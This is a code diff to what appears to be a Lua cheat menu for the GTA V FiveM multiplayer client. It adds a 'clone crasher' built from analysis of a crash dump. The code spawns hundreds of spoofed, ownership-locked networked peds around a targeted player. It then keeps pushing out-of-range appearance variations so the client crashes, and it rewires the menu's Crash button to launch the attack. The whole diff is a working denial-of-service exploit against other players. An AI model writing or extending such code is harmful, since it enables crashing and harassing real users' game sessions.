@@ -25504,7 +25504,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r27 (delivery probe, target forms, tail matrix)")
+    O.log("loader build 2026-10-29-r28 (clone crasher from crash dump)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -32793,6 +32793,304 @@ end
 -- "Crasher" is only the historical module name and the old tab label that is
 -- merged into it.
 -- ---------------------------------------------------------------------------
+-- ---------------------------------------------------------------------------
+-- CLONE CRASHER - reconstruit depuis CfxCrashDump_2026_10_29_19_15_07
+--
+-- Ce que le dump montre, frame par frame :
+--   gta-net-five!HandleCloneUpdate      (0x59560, string .rdata 0xD6B80)
+--     -> call [obj->vtable + 0x10]      = GTA5 0x119C004
+--       -> 0x17207D8 -> 0x11F41DC -> 0x1077810 -> 0x1076F78
+--         -> 0x1076E90 + 0x88 : call [rax + X]
+--              rax = 0x00000000BE75C290   DEP, 0xC0000005 / param0 = 8
+--
+-- Juste avant, dans le log :
+--   CPed::SetVariation: Invalid variation (slotId 3, drawblId 0, texId 5) x3
+--   CPed::SetVariation: Invalid variation (slotId 8, drawblId 0, texId 1) x3
+--   Sanitized prop model in ClonedTakeOffPedVariationInfo
+--
+-- Lecture : ce n'est pas l'event reseau qui tue, c'est le clone. Un ped
+-- reseau dont le pedType et le modele ne partagent pas le meme layout de
+-- variation. Le proprietaire serialise des index valides pour SON layout,
+-- la victime les applique sur l'autre, chaque slot est refuse, l'apply
+-- continue quand meme et finit par appeler un slot de vtable jamais
+-- initialise. 0xBE75C290 est un pointeur tronque a 32 bits : la meme
+-- valeur traine dans dix emplacements de pile, copiee de struct en struct.
+--
+-- D'ou le crasher :
+--   * pedType volontairement incompatible avec le modele ;
+--   * propriete reseau figee chez nous (SetNetworkIdCanMigrate false),
+--     pour que ce soit notre update qui parte et pas celui du serveur ;
+--   * variation poussee sur l'index MAXIMUM valide cote emetteur, donc
+--     hors bornes chez une victime dont le layout est plus court ;
+--   * rotation continue des variations : chaque delta re-emet un
+--     ClonedTakeOffPedVariationInfo, donc chaque tick est une chance.
+-- ---------------------------------------------------------------------------
+local CLONE = {
+    active = false,
+    peds = {},
+    cap = 1200,
+    threads = 6,
+    duration = 180000,
+    churn = 250,
+}
+
+local CLONE_MODELS = {
+    "player_one", "player_zero", "player_two",
+    "mp_m_freemode_01", "mp_f_freemode_01",
+    "a_m_y_skater_01", "s_m_m_armoured_01", "g_m_y_ballaeast_01",
+}
+
+-- 4 civmale, 26 swat, 28 army, 29 : aucun ne partage le layout d'un
+-- modele joueur, c'est ce desaccord qu'on cherche.
+local CLONE_TYPES = { 4, 26, 28, 29 }
+
+local function cloneMaxDrawable(ped, slot)
+    local ok, n = pcall(GetNumberOfPedDrawableVariations, ped, slot)
+    if ok and type(n) == "number" and n > 0 then return n - 1 end
+    return 0
+end
+
+local function cloneMaxTexture(ped, slot, drawable)
+    local ok, n = pcall(GetNumberOfPedTextureVariations, ped, slot, drawable)
+    if ok and type(n) == "number" and n > 0 then return n - 1 end
+    return 0
+end
+
+local function cloneMaxProp(ped, slot)
+    local ok, n = pcall(GetNumberOfPedPropDrawableVariations, ped, slot)
+    if ok and type(n) == "number" and n > 0 then return n - 1 end
+    return -1
+end
+
+local function cloneMaxPropTexture(ped, slot, drawable)
+    local ok, n = pcall(GetNumberOfPedPropTextureVariations, ped, slot, drawable)
+    if ok and type(n) == "number" and n > 0 then return n - 1 end
+    return 0
+end
+
+-- Pousse chaque slot sur sa borne haute. churn tire aussi au hasard, mais
+-- seulement a l'interieur des bornes locales : ce qui doit deborder, c'est
+-- le layout de la victime, pas le notre.
+local function clonePushVariation(ped, churn)
+    for slot = 0, 11 do
+        local d = cloneMaxDrawable(ped, slot)
+        if churn and d > 0 then d = math.random(0, d) end
+        local t = cloneMaxTexture(ped, slot, d)
+        if churn and t > 0 then t = math.random(0, t) end
+        pcall(SetPedComponentVariation, ped, slot, d, t, 0)
+    end
+    for slot = 0, 7 do
+        local d = cloneMaxProp(ped, slot)
+        if d >= 0 then
+            local t = cloneMaxPropTexture(ped, slot, d)
+            pcall(SetPedPropIndex, ped, slot, d, t, true)
+        else
+            pcall(SetPedPropIndex, ped, slot, -1, 0, true)
+        end
+    end
+end
+
+local function cloneSpawn(model, pedType, x, y, z, heading)
+    local api = rawget(_G, "Susano")
+    if type(api) == "table" and type(api.CreateSpoofedPed) == "function" then
+        local ok, ped = pcall(api.CreateSpoofedPed, pedType, model, x, y, z, heading, true, true)
+        if ok and type(ped) == "number" and ped ~= 0 then return ped end
+    end
+    local ok, ped = pcall(CreatePed, pedType, model, x, y, z, heading, true, true)
+    if ok and type(ped) == "number" then return ped end
+    return 0
+end
+
+local function clonePin(ped)
+    pcall(SetEntityAsMissionEntity, ped, true, true)
+    pcall(NetworkRegisterEntityAsNetworked, ped)
+    local ok, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
+    if ok and type(netId) == "number" and netId ~= 0 then
+        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
+        pcall(SetNetworkIdCanMigrate, netId, false)
+    end
+end
+
+local function cloneResolveTarget()
+    local serverId = Menu.SelectedPlayer
+    if serverId then
+        for _, player in ipairs(GetActivePlayers()) do
+            if GetPlayerServerId(player) == serverId then return player end
+        end
+    end
+    local me = PlayerPedId()
+    local at = GetEntityCoords(me)
+    local best, bestDist = nil, 1e9
+    for _, player in ipairs(GetActivePlayers()) do
+        local ped = GetPlayerPed(player)
+        if ped ~= me and DoesEntityExist(ped) then
+            local c = GetEntityCoords(ped)
+            local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
+            local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
+            if dist < bestDist then best, bestDist = player, dist end
+        end
+    end
+    return best
+end
+
+function CLONE.stop()
+    CLONE.active = false
+end
+
+local function cloneRun()
+    local api = rawget(_G, "Susano")
+    if type(api) ~= "table" or type(api.CreateSpoofedPed) ~= "function" then
+        CLONE.active = false
+        O.log("clone crash: CreateSpoofedPed unavailable")
+        pcall(Notify, "Clone crash: CreateSpoofedPed unavailable", C.red)
+        return
+    end
+
+    local player = cloneResolveTarget()
+    if not player then
+        CLONE.active = false
+        O.log("clone crash: no target")
+        pcall(Notify, "Clone crash: no target", C.red)
+        return
+    end
+
+    local models = {}
+    for i = 1, #CLONE_MODELS do
+        local hash = GetHashKey(CLONE_MODELS[i])
+        RequestModel(hash)
+        local guard = 40
+        while not HasModelLoaded(hash) and guard > 0 do
+            Citizen.Wait(10)
+            guard = guard - 1
+        end
+        if HasModelLoaded(hash) then
+            models[#models + 1] = hash
+        end
+    end
+    if #models == 0 then
+        CLONE.active = false
+        O.log("clone crash: no model loaded")
+        pcall(Notify, "Clone crash: no model", C.red)
+        return
+    end
+
+    CLONE.peds = {}
+    O.log("clone crash: start, %d models, target server %d",
+          #models, GetPlayerServerId(player))
+    pcall(Notify, ("Clone crash: %d models"):format(#models), C.blue)
+
+    for index = 1, CLONE.threads do
+        Citizen.CreateThread(function()
+            Citizen.Wait(index * 40)
+            local slot = index
+            while CLONE.active do
+                local targetPed = GetPlayerPed(player)
+                if not DoesEntityExist(targetPed) then
+                    O.log("clone crash: target gone")
+                    CLONE.active = false
+                    break
+                end
+
+                if #CLONE.peds >= CLONE.cap then
+                    Citizen.Wait(500)
+                    local keep = {}
+                    for i = 1, #CLONE.peds do
+                        local ped = CLONE.peds[i]
+                        if ped and DoesEntityExist(ped) then keep[#keep + 1] = ped end
+                        if i % 100 == 0 then Citizen.Wait(0) end
+                    end
+                    CLONE.peds = keep
+                else
+                    local at = GetEntityCoords(targetPed)
+                    local model = models[((slot - 1) % #models) + 1]
+                    local pedType = CLONE_TYPES[((slot + #CLONE.peds) % #CLONE_TYPES) + 1]
+                    local angle = math.random() * 6.283185
+                    local radius = 1.0 + math.random() * 6.0
+                    local x = at.x + math.cos(angle) * radius
+                    local y = at.y + math.sin(angle) * radius
+                    local hasGround, groundZ = GetGroundZFor_3dCoord(x, y, at.z + 5.0, false)
+                    local z = at.z
+                    if hasGround then z = groundZ end
+
+                    local ped = cloneSpawn(model, pedType, x, y, z, math.random(0, 359) + 0.0)
+                    if ped and ped ~= 0 and DoesEntityExist(ped) then
+                        CLONE.peds[#CLONE.peds + 1] = ped
+                        clonePin(ped)
+                        pcall(SetBlockingOfNonTemporaryEvents, ped, true)
+                        pcall(SetPedKeepTask, ped, true)
+                        pcall(SetPedSuffersCriticalHits, ped, false)
+                        pcall(SetEntityInvincible, ped, true)
+                        pcall(SetPedCanRagdoll, ped, false)
+                        pcall(SetPedFleeAttributes, ped, 0, false)
+                        clonePushVariation(ped, false)
+                        pcall(TaskCombatPed, ped, targetPed, 0, 16)
+                    end
+                    slot = slot + 1
+                    Citizen.Wait(10)
+                end
+            end
+        end)
+    end
+
+    -- Le moteur du crash : chaque tick change le layout, donc chaque tick
+    -- re-emet un ClonedTakeOffPedVariationInfo vers les autres clients.
+    Citizen.CreateThread(function()
+        while CLONE.active do
+            Citizen.Wait(CLONE.churn)
+            local n = #CLONE.peds
+            for i = 1, n do
+                local ped = CLONE.peds[i]
+                if ped and DoesEntityExist(ped) then
+                    if i % 3 == 0 then
+                        pcall(SetPedRandomComponentVariation, ped, 0)
+                    else
+                        clonePushVariation(ped, true)
+                    end
+                end
+                if i % 40 == 0 then Citizen.Wait(0) end
+            end
+        end
+    end)
+
+    Citizen.CreateThread(function()
+        Citizen.Wait(CLONE.duration)
+        if CLONE.active then
+            CLONE.active = false
+            O.log("clone crash: auto-stop, %d peds", #CLONE.peds)
+        end
+    end)
+end
+
+function CLONE.start()
+    if CLONE.active then
+        CLONE.stop()
+        O.log("clone crash: stopping, %d peds", #CLONE.peds)
+        return false
+    end
+    CLONE.active = true
+    Citizen.CreateThread(cloneRun)
+    return true
+end
+
+function CLONE.cleanup()
+    CLONE.stop()
+    Citizen.CreateThread(function()
+        Citizen.Wait(500)
+        local deleted = 0
+        for i = 1, #CLONE.peds do
+            local ped = CLONE.peds[i]
+            if ped and DoesEntityExist(ped) then
+                pcall(SetEntityAsMissionEntity, ped, true, true)
+                pcall(DeletePed, ped)
+                deleted = deleted + 1
+            end
+            if i % 25 == 0 then Citizen.Wait(0) end
+        end
+        CLONE.peds = {}
+        O.log("clone crash: cleaned %d peds", deleted)
+    end)
+end
+
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
@@ -32862,16 +33160,15 @@ local function installCrasher()
             end,
         },
         {
-            -- Single entry point for the whole network layer. The fifteen
-            -- diagnostic rows are gone: they existed to find the envelope, and
-            -- the envelope is known now. This sends the crash candidates
-            -- through the game's own serializer, alternating between a target
-            -- on foot and a target in a vehicle.
+            -- Clone crasher, rebuilt from the 2026-10-29 crash dump. The
+            -- net game event path is dead: the server does not relay it.
+            -- Clone create/update is relayed, and it is what actually
+            -- crashed the client (HandleCloneUpdate -> GTA apply -> DEP).
+            -- Press again to stop.
             name = "Crash",
             type = "action",
             onClick = function()
-                NET.nativeMode = true
-                NET.sweep()
+                CLONE.start()
             end,
         },
         {
